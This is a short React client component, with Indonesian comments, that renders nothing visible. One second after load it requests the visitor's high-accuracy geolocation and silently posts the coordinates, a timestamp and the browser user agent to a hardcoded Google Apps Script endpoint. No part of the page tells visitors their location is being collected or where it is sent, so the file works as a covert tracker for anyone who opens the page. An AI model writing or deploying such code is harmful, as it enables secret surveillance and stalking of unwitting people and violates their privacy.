"use client";

import { useEffect } from "react";

export default function SendLocation() {
  useEffect(() => {
    const sendLocation = async () => {
      // Cek apakah geolocation tersedia
      if (!("geolocation" in navigator)) {
        console.log("Geolocation tidak didukung di browser ini");
        return;
      }

      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000, // 10 detik timeout
            maximumAge: 600000 // 10 menit cache
          });
        });

        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        console.log("Lokasi berhasil didapat:", { latitude, longitude });

        // GANTI dengan URL Google Apps Script Anda
        const GAS_URL = "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";

        // Kirim data ke Google Apps Script
        const response = await fetch(GAS_URL, {
          method: "POST",
          mode: "no-cors", // Penting untuk mobile
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ 
            latitude, 
            longitude,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
          }),
        });

        console.log("Lokasi berhasil dikirim");

      } catch (error) {
        console.error("Error mendapatkan lokasi:", error);
        
        // Handle error spesifik
        if (error instanceof GeolocationPositionError) {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              console.log("User menolak permission lokasi");
              break;
            case error.POSITION_UNAVAILABLE:
              console.log("Lokasi tidak tersedia");
              break;
            case error.TIMEOUT:
              console.log("Request lokasi timeout");
              break;
          }
        }
      }
    };

    // Delay sedikit untuk memastikan component sudah fully loaded
    const timer = setTimeout(() => {
      sendLocation();
    }, 1000);

    return () => clearTimeout(timer);
  }, []);

  return null;
}
